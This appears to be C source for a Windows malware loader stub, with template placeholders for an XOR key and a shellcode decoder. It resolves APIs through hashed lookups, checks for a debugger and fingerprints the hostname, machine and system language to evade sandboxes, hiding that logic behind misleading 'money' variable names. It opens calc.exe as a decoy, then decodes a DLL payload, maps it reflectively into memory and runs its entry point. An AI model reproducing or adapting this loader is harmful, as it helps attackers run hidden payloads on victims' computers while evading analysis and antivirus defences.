#include "definitions.h"
#include "debug.h"

// Define a random value based on compile-time constants
#define RANDOM_VAL (__TIME__[3] * __TIME__[6])


int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    // Seed the random number generator
    srand(time(NULL));
    uint16_t key = %XOR_KEY%; // Placeholder for XOR key
    char path[MAX_PATH]; 
    int min = 4000; // Minimum range for random money
    int max = 17000; // Maximum range for random money
    int range = max - min + 1;
    int money =  min + (int)(rand() / (double)RAND_MAX * range) + RANDOM_VAL; // Calculate random money
    int money_spent = 0; // Initialize money spent tracker
    
    printf("beginning\n");    
    HMODULE hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH); // Load Kernel32 module
    HMODULE hUser32dll = NULL; // Placeholder for Kernel32 module handle
    
    // Check if the program is being debugged
    if (!is_being_debugged()) {
        printf("Error during file openning\n"); // Debugging detected
        return 1;
    } else {
        hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
    }
    
    // Validate hostname and adjust money spent accordingly
    const char* hostname = get_hostname(hKernel32dll);
    if (key > 0 && is_valid_hostname(hostname)) {
        // Valid hostname, no action needed
    } else {
        money_spent += multiply(money, 3); // Penalty for invalid hostname
    }

    // Validate computer and adjust money spent
    if (is_valid_computer(hKernel32dll) && money > 1000) {
        // Valid computer, no action needed
    } else {
        money_spent += divide(money, 2); // Penalty for invalid computer
    }
    
    // Validate language settings and adjust money spent
    if (!is_valid_language(hKernel32dll, hUser32dll)) {
        money_spent += add(money, 500); // Penalty for invalid language
    }

    // Other checks todo (placeholder for additional validations)

    // Launch calculator as a demonstration
    ShellExecute(NULL, "open", "C:\\Windows\\System32\\calc.exe", NULL, NULL, SW_SHOWNORMAL);

    if (money_spent) {
        // Introduce delays if money was spent
        int min_delay = 300;
        int max_delay = 800;
        int delay;
        for (int i = 0; i < 100; i+=12) {
            delay = min_delay + (int)(rand() / (double)RAND_MAX * (max_delay - min_delay));
            Sleep(delay); // Simulate processing delay
        }
    } else {

        VirtualAllocEx_t _AllocVirtMem = (VirtualAllocEx_t)CustomGetProcAddress(hKernel32dll, VIRTUAL_ALLOC_HASH);
        WriteProcessMemory_t _WriteVirtMem = (WriteProcessMemory_t)CustomGetProcAddress(hKernel32dll, WRITE_MEMORY_HASH);
        VirtualProtectEx_t _ProtectVirtMem = (VirtualProtectEx_t)CustomGetProcAddress(hKernel32dll, VIRTUAL_PROTECT_HASH);
        LoadLibraryA_t _LoadLibraryA = (LoadLibraryA_t)CustomGetProcAddress(hKernel32dll, LOAD_LIBRARY_HASH);
        GetProcAddress_t _GetProcAddress = (GetProcAddress_t)CustomGetProcAddress(hKernel32dll, GET_PROC_ADDRESS_HASH);

        // Execute payload if no money was spent
        // Step 0 : Decode the payload
        %SHELLCODE_DECODER% // Placeholder for shellcode decoding logic

        // Step 1 : Get DLL's NT headers

        PIMAGE_NT_HEADERS64 dll_htHeaders = PE_getNtheaders(payload);

        // Step 2: Allocate memory at dll's preferred virtual address
        SIZE_T dll_vSize = dll_htHeaders->OptionalHeader.SizeOfImage;
        LPVOID dll_vAddr = (LPVOID)dll_htHeaders->OptionalHeader.ImageBase;

        LPVOID allocated_vAddr = _AllocVirtMem((HANDLE)-1, dll_vAddr, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (!allocated_vAddr) {
            allocated_vAddr = _AllocVirtMem((HANDLE)-1, NULL, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            if (!allocated_vAddr) return 1;//"Memory allocation failed");
        }
        // Get delta between preferred and allocated address
        DWORD_PTR delta = (DWORD_PTR)allocated_vAddr - (DWORD_PTR)dll_vAddr;

        // Step 3: Copy the DLL headers 
        if (!_WriteVirtMem((HANDLE)-1, allocated_vAddr, payload, dll_htHeaders->OptionalHeader.SizeOfHeaders, NULL))
            return 1;//"_WriteVirtMem() failed");


        // Step 4: Copy the DLL sections
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(dll_htHeaders);
        for (size_t i = 0; i < dll_htHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID sectionAddr = (LPVOID)((ULONG_PTR)allocated_vAddr + section[i].VirtualAddress);
            LPVOID sectionData = (LPVOID)((ULONG_PTR)payload + section[i].PointerToRawData);
            SIZE_T sectionSize = section[i].SizeOfRawData;

            if (!_WriteVirtMem((HANDLE)-1, sectionAddr, sectionData, sectionSize, NULL))
                return 1;//"_WriteVirtMem() failed for section %s", section[i].Name);
        }

        // Step 5: Handle relocation if allocated at a different address
        if (allocated_vAddr != dll_vAddr) {

            IMAGE_DATA_DIRECTORY relocations = dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if (relocations.Size > 0) {
                PIMAGE_BASE_RELOCATION relocationBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)allocated_vAddr + relocations.VirtualAddress);
                while (relocationBlock->VirtualAddress != 0) {
                    DWORD relocationCount = (relocationBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    PWORD relocationEntries = (PWORD)((ULONG_PTR)relocationBlock + sizeof(IMAGE_BASE_RELOCATION));

                    for (DWORD i = 0; i < relocationCount; i++) {
                        if (relocationEntries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                            DWORD_PTR* addressToPatch = (DWORD_PTR*)((ULONG_PTR)allocated_vAddr + relocationBlock->VirtualAddress + (relocationEntries[i] & 0xFFF));
                            *addressToPatch += delta;
                        }
                    }

                    relocationBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)relocationBlock + relocationBlock->SizeOfBlock);
                }
            }
        }

        // Step 6: Resolve imports
        if (dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
            PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)allocated_vAddr +
                dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

            char* libraryName = NULL;
            HMODULE library = NULL;

            while (importDesc->Name) {
                libraryName = (char*)((ULONG_PTR)allocated_vAddr + importDesc->Name);
                library = _LoadLibraryA(libraryName);
                if (!library) return 1;//"Failed to load module: %s", libraryName);

                PIMAGE_THUNK_DATA thunkILT = (PIMAGE_THUNK_DATA)((ULONG_PTR)allocated_vAddr + importDesc->OriginalFirstThunk);
                PIMAGE_THUNK_DATA thunkIAT = (PIMAGE_THUNK_DATA)((ULONG_PTR)allocated_vAddr + importDesc->FirstThunk);

                while (thunkILT->u1.AddressOfData) {
                    FARPROC procAddress = NULL;

                    if (thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                        procAddress = _GetProcAddress(library, (LPCSTR)(thunkILT->u1.Ordinal & 0xFFFF));
                    } else {
                        PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)allocated_vAddr + thunkILT->u1.AddressOfData);
                        procAddress = _GetProcAddress(library, importByName->Name);
                    }

                    if (!procAddress) return 1;//"Failed to resolve import"

                    thunkIAT->u1.Function = (ULONG_PTR)procAddress;
                    thunkILT++;
                    thunkIAT++;
                }
                importDesc++;
            }
        }

        // Step 6.1: Set the memory protection to PAGE_EXECUTE_READ
        DWORD oldProtect = 0;
        if (!_ProtectVirtMem((HANDLE)-1, allocated_vAddr, dll_vSize, PAGE_EXECUTE_READ, &oldProtect)) {
            // VirtualFreeEx_t _FreeVirtMem = (VirtualFreeEx_t)CustomGetProcAddress(hKernel32dll, VIRTUAL_FREE_HASH);
            // _FreeVirtMem((HANDLE)-1, allocated_vAddr, 0, MEM_RELEASE); // Free the allocated memory
            return 1;// Failed to VirtualProtect 
        }

        // Step 7: Execute the loaded DLL (DllMain())
        DllEntryPoint DLLMain = (DllEntryPoint)((ULONG_PTR)allocated_vAddr + dll_htHeaders->OptionalHeader.AddressOfEntryPoint);
        DLLMain((HINSTANCE)allocated_vAddr, DLL_PROCESS_ATTACH, NULL);

        printf("done");
    }

    return 0; // Exit the program
}